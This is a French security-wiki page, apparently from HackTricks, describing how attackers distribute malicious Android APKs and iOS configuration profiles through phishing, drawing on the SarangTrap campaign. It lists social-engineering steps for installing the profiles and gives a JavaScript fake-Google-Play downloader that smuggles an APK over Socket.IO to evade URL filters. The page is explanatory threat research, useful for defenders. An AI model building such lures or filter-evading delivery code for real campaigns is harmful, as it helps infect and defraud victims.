# Hameçonnage mobile et distribution d’applications malveillantes (Android et iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page présente les techniques utilisées par les acteurs malveillants pour distribuer des **APK Android malveillants** et des **profils de configuration mobile iOS** par hameçonnage (SEO, ingénierie sociale, faux magasins d’applications, applications de rencontre, etc.).
> Le contenu est adapté de la campagne SarangTrap révélée par Zimperium zLabs (2025) et d’autres recherches publiques.<sup>[[1]](#references)</sup>

## Déroulement de l’attaque

1. **Infrastructure SEO/hameçonnage**
   * Enregistrer des dizaines de domaines ressemblants (rencontres, partage cloud, service automobile…).
     – Utiliser des mots-clés dans la langue locale et des émojis dans l’élément `<title>` pour améliorer le classement sur Google.
     – Héberger sur la même page d’atterrissage les instructions d’installation pour **Android** (`.apk`) et **iOS**.
2. **Téléchargement de la première étape**
   * Android : lien direct vers un APK *non signé* ou provenant d’un « magasin d’applications tiers ».
   * iOS : lien `itms-services://` ou HTTPS classique vers un profil **mobileconfig** malveillant (voir ci-dessous).
3. **Comportement post-installation sur Android**
   * L’exécution déclenchée par C2, l’abus de permissions, les contournements de dropper, la collecte en arrière-plan et d’autres comportements de malware après installation sont abordés dans la page dédiée ci-dessous sur le post-exploitation des malwares Android.
4. **Technique de distribution sur iOS**
   * Un seul **profil de configuration mobile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc., afin d’inscrire l’appareil dans une supervision de type « MDM ».
   * Instructions d’ingénierie sociale :
     1. Ouvrir Réglages ➜ *Profil téléchargé*.
     2. Appuyer trois fois sur *Installer* (captures d’écran sur la page d’hameçonnage).
     3. Faire confiance au profil non signé ➜ l’attaquant obtient les droits d’accès aux *Contacts* et aux *Photos* sans examen de l’App Store.
5. **Charge utile Web Clip iOS (icône d’application d’hameçonnage)**
   * Les charges utiles `com.apple.webClip.managed` peuvent **épingler une URL d’hameçonnage sur l’écran d’accueil** avec une icône et un libellé personnalisés.
   * Les Web Clips peuvent s’exécuter **en plein écran** (en masquant l’interface du navigateur) et être marqués comme **non supprimables**, obligeant la victime à supprimer le profil pour retirer l’icône.<sup>[[3]](#references)</sup>
6. **Couche réseau**
   * HTTP en clair, souvent sur le port 80, avec un en-tête HOST tel que `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facile à repérer).

## Post-exploitation des malwares Android

Pour les techniques de malware Android après installation, comme C2, l’abus d’Accessibility, les overlays, l’automatisation ATS, le chargement échelonné de DEX, les SMS surtaxés et la persistance, voir :

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Smuggling d’APK par Socket.IO/WebSocket et fausses pages Google Play

Les attaquants remplacent de plus en plus les liens APK statiques par un canal Socket.IO/WebSocket intégré à des leurres imitant Google Play. Cela dissimule l’URL de la charge utile, contourne les filtres d’URL et d’extension, et conserve une expérience d’installation réaliste.<sup>[[2]](#references)[[4]](#references)</sup>

Déroulement typique côté client observé dans la nature :

<details>
<summary>Téléchargeur Play contrefait avec Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Pourquoi cela échappe aux contrôles simples :
- Aucune URL d’APK statique n’est exposée ; le payload est reconstruit en mémoire à partir des frames WebSocket.
- Les filtres d’URL, de MIME et d’extension qui bloquent les réponses directes en .apk peuvent ne pas détecter les données binaires acheminées via WebSockets/Socket.IO.
- Les crawlers et les bacs à sable d’URL qui n’exécutent pas les WebSockets ne récupéreront pas le payload.

Voir aussi les techniques et outils WebSocket :

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Le côté obscur de la romance : campagne d’extorsion SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Paramètres de payload Web Clips pour les appareils Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Cheval de Troie bancaire ciblant les utilisateurs Android indonésiens et vietnamiens](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
